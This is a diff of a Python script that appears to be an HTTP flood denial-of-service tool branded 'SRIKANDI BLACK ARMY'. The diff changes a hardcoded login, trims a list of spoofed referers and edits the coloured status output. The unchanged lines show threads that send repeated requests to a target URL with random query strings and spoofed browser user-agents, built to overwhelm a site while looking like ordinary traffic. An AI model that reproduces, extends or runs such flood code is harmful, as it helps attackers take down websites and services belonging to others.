@@ -53,7 +53,7 @@ while attemps < 100:
     username = input("\033[32mEnter your username: \033[0m")
     password = input("\033[32mEnter your password: \033[0m")
 
-    if username == 'sr313' and password == 'sr313':
+    if username == 'srk313' and password == 'srk313':
         print("\033[32m⟩⟩SRIKANDI BLACK ARMY\033[0m")
         break
     else:
@@ -67,11 +67,9 @@ headers = []
 referer = [
     "https://github.com",
     "https://google.it",
-    "https://facebook.com",
     "https://alibaba.com",
     "https://google.com",
     "https://youtube.com",
-    "https://instagram.com",
     ]
 
 def useragent():
@@ -82,7 +80,6 @@ def useragent():
     headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
     headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
     headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
-
     return headers
 
 
@@ -105,8 +102,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print(f"\033[31m[]  \033[38;5;206mSRIKANDI-313  \033[97mSent to ••>   \033[34m[" +str(url)+ "]\033[0m")
-                print(f"\033[33m[] \033[33mSRIKANDI-313  \033[96mSent to ••>   \033[97m[" +str(url)+ "]\033[0m")
+                print(f"\033[33m[] \033[96mSRIKANDI-313  \033[96mSent to ••>   \033[97m[" +str(url)+ "]\033[0m")
             except requests.exceptions.ConnectionError:
                 print(f"\033[97m[] \033[102mSRIKANDI-313  \033[31mSent to ••>   \033[33m[" +str(url)+ "]\033[0m")
 
